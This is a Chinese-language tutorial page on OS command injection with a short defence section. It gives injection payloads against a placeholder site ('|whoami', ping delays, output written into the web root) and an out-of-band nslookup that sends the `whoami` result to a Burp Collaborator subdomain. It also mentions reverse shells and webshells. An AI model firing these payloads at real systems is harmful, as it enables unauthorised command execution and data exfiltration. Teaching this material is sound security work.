---
description: OWASP-TOP10 漏洞
---

# 😀 命令注入

## 介绍

命令注入漏洞是一种允许攻击者在运行应用程序的服务器上执行任意操作系统命令，攻击者通过会利用此漏洞来破坏基础设施的其他部分，利用信任关系将攻击转向组织内的其他系统

## 影响

根据应用程序运行的权限，造成不同的影响

## 攻击

### 1. 插入特殊字符来检测分割符

```shell
&
;
换行符 (0x0a or \n)
&&
|
||
```

```shell
# 正常的 HTTP 请求
https://vulnerable-website.com/endpoint?parameter=123

# payload
https://vulnerable-website.com/endpoint?parameter=1|whoami
```

### 2. 时间延迟

> 大多数操作系统命令注入都是盲注，不会为我们产生任何输出，我们可以使用时间延迟来验证命令注入

```shell
# ping -c 10 127.0.0.1
https://vulnerable-website.com/endpoint?parameter=x||ping+-c+10+127.0.0.1||
```

### 3. 重定向输出

> 我们可以将注入命令的输出重定向到 WEB 根目录的一个文件中，然后访问它

```shell
https://vulnerable-website.com/endpoint?parameter=12||whoami>/var/www/images/output.txt||
```

### 4. 使用 OAST 进行操作系统命令注入

**payload**：使用`Burp Collaborator Client`

```shell
注入点=x||nslookup+burpcollaborator.net||
```

payload

```shell
注入点=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
```

## 5. 获取 REVRSE SHELL

> 可以借助命令执行来获取 REVERSE SHELL ，也可以进行文件上传一些特殊页面，实现获取 SHELL

## 防御

> 到目前为止，防止操作系统命令注入漏洞的最有效方法是永远不要从应用层代码中调用操作系统命令。
>
> 在很多情况下，都有使用更安全的平台API实现所需功能的替代方法。

如果使用用户提供的输入向操作系统命令发出呼叫被认为是不可避免的，则必须执行强输入验证。有效验证的一些示例包括：

* 对准允许值的白名单进行验证。
* 验证输入是一个数字。
* 验证输入仅包含字母数字字符，没有其他语法或空白。

## 配合

### 1. 文件上传&命令注入

利用文件上传一些 WEBSHELL

&#x20;

## 参考文章

* [操作系统命令注入](https://portswigger.net/web-security/os-command-injection)
* [狼组安全团队公开知识库](https://wiki.wgpsec.org/knowledge/web/cmd\_injection.html)

## 提升

* [命令注入漏洞介绍-上](https://www.freebuf.com/articles/web/276503.html)
* [命令注入漏洞介绍-下](https://www.freebuf.com/articles/web/276505.html)
